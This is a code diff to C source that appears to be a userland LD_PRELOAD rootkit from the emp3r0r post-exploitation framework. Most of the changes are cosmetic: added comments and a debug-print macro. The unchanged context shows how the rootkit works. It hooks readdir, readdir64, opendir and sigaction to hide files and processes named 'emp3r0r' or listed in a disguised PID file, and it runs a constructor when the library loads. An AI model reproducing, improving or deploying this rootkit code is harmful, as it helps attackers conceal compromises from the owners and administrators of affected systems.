@@ -13,6 +13,13 @@
 #include <sys/wait.h>
 #include <unistd.h>
 
+// Debug print macro
+#ifdef DEBUG
+#define DEBUG_PRINT(fmt, args...) fprintf(stderr, fmt, ##args)
+#else
+#define DEBUG_PRINT(fmt, args...) // Do nothing
+#endif
+
 // customize these
 const char *HIDE_ME = "emp3r0r";
 const char *HIDDEN_PIDS = "/usr/share/at/batch-job.at";
@@ -37,6 +44,7 @@ int sigaction(int signum, const struct sigaction *act,
   return orig_sigaction(signum, act, oldact);
 }
 
+// Check if a file exists
 int is_file_exist(const char *path) {
   if (access(path, F_OK) != -1) {
     return 1;
@@ -44,6 +52,7 @@ int is_file_exist(const char *path) {
   return 0;
 }
 
+// Check if a string is in a file
 int is_str_in_file(const char *path, const char *str) {
   FILE *fd = fopen(path, "r");
   int bufferLength = 255;
@@ -59,7 +68,7 @@ int is_str_in_file(const char *path, const char *str) {
   return 0;
 }
 
-// check if a pid/file should be hidden
+// Check if a pid/file should be hidden
 // returns 1 if is PID and hidden
 // returns 2 if is file and hidden
 // returns 0 if not hidden
@@ -95,16 +104,17 @@ static int get_dir_name(DIR *dirp, char *dir_name, size_t size) {
   return 1;
 }
 
+// Override opendir function
 DIR *opendir(const char *name) {
   static DIR *(*orig_opendir)(const char *) = NULL;
   if (!orig_opendir)
     orig_opendir = dlsym(RTLD_NEXT, "opendir");
 
   DIR *result = orig_opendir(name);
-
   return result;
 }
 
+// Override readdir64 function
 struct dirent64 *readdir64(DIR *dirp) {
   static struct dirent64 *(*orig_readdir64)(DIR *dirp) = NULL;
   if (!orig_readdir64)
@@ -143,6 +153,7 @@ struct dirent64 *readdir64(DIR *dirp) {
   return result;
 }
 
+// Override readdir function
 struct dirent *readdir(DIR *dirp) {
   static struct dirent *(*orig_readdir)(DIR *dirp) = NULL;
   if (!orig_readdir)
@@ -181,6 +192,7 @@ struct dirent *readdir(DIR *dirp) {
   return result;
 }
 
+// Initialization function
 void __attribute__((constructor)) initLibrary(void) {
   // ignore SIGCHLD
   signal(SIGCHLD, SIG_IGN);
@@ -195,7 +207,7 @@ void __attribute__((constructor)) initLibrary(void) {
   // this should be in sync with emp3r0r inject_loader module
   char *exe = calloc(1024, sizeof(char));
   if (readlink("/proc/self/exe", exe, 1024) < 0) {
-    perror("readlink");
+    DEBUG_PRINT("readlink failed\n");
     return;
   }
   const char *exe_name = basename(exe);
@@ -236,4 +248,5 @@ void __attribute__((constructor)) initLibrary(void) {
   }
 }
 
+// Cleanup function
 void __attribute__((destructor)) cleanUpLibrary(void) {}
